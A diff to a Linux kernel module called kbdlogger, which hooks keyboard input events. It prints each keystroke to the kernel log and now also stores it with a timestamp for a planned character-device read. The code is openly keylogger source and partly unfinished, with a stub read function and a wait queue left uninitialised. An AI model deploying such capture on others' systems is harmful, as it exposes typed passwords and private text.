@@ -32,6 +32,22 @@
 #include <linux/platform_device.h>
 #include <linux/uaccess.h>
 #include <linux/major.h>
+#include <linux/wait.h>
+#include <linux/sched.h>
+#include <linux/input/mt.h>
+#include <linux/hrtimer.h>
+#include <linux/timer.h>
+#include <linux/ktime.h>
+
+
+#include <linux/poll.h>
+#include <linux/vmalloc.h>
+#include <linux/mm.h>
+#include <linux/init.h>
+#include <linux/input/mt.h>
+#include <linux/major.h>
+#include <linux/device.h>
+
 
 MODULE_AUTHOR("Rafael do Nascimento Pereira <rnp@25ghz.net>");
 MODULE_LICENSE("GPL");
@@ -51,9 +67,23 @@ struct kbldev {
 	struct input_handle handle;
 	struct device dev;
 	struct cdev cdev;
+	struct mutex mutex;
+	struct input_event kbdevent;
+	wait_queue_head_t wait;
 	bool exist;
 };
 
+struct client {
+	struct fasync_struct *fasync;
+	struct kbldev *kbldev;
+	struct input_event kbdevent;
+};
+
+static ssize_t kbldev_read(struct file *file, char __user *buffer,
+			   size_t count, loff_t *ppos)
+{
+	return 0;
+}
 
 static int kbldev_release(struct inode *inode, struct file *file)
 {
@@ -63,12 +93,15 @@ static int kbldev_release(struct inode *inode, struct file *file)
 
 static int kbldev_open(struct inode *inode, struct file *file)
 {
+	//struct kbldev *kbldev = container_of(inode->i_cdev, struct kbldev, cdev);
+
 	return 0;
 }
 
 static const struct file_operations kbldev_fops = {
 	.owner    = THIS_MODULE,
 	.open     = kbldev_open,
+	.read     = kbldev_read,
 	.release  = kbldev_release,
 };
 
@@ -94,16 +127,20 @@ static void kbdlogger_cleanup(struct kbldev *kbldev)
 	if (!kbldev)
 		return;
 
+	kbldev_mark_dead(kbldev);
+	//wake_up_interruptible(&kbldev->wait);
 	cdev_del(&kbldev->cdev);
 
-	if (handle)
+	if (handle) {
+		input_flush_device(handle, NULL);
 		input_close_device(handle);
-	else
+	} else
 		pr_err("input device already NULL\n");
 }
 
 static int kbdlogger_connect(struct input_handler *handler,
-		struct input_dev *dev, const struct input_device_id *id)
+			     struct input_dev *dev,
+			     const struct input_device_id *id)
 {
 	int error;
 	int minor;
@@ -126,6 +163,9 @@ static int kbdlogger_connect(struct input_handler *handler,
 		error = -ENOMEM;
 		goto err_free_minor;
 	}
+
+	mutex_init(&kbldev->mutex);
+	// TODO: enable later init_waitqueue_head(&kbldev->wait);
 
 	dev_no = minor;
 	/* Normalize device number if it falls into legacy range */
@@ -158,6 +198,7 @@ static int kbdlogger_connect(struct input_handler *handler,
 	if (error)
 		goto err_cleanup_kbldev;
 
+	/* TODO: this function must be moved to kbl_open() */
 	error = input_open_device(&kbldev->handle);
 	if (error)
 		goto err_cleanup_kbldev;
@@ -185,9 +226,19 @@ err_free_minor:
 static void kbdlogger_event(struct input_handle *handle, unsigned int type,
 			unsigned int code, int value)
 {
-	if (type == EV_KEY) {
+	struct kbldev *kbldev = handle->private;
+	ktime_t time_mono;
+
+	if (type == EV_KEY || type == EV_SYN) {
 		pr_info("Key event. Dev: %s, Type: %d, Code: %d, Value: %d\n",
 		dev_name(&handle->dev->dev), type, code, value);
+
+		time_mono = ktime_get();
+
+		kbldev->kbdevent.time = ktime_to_timeval(time_mono);
+		kbldev->kbdevent.type = type;
+		kbldev->kbdevent.code = code;
+		kbldev->kbdevent.value = value;
 	}
 }
 
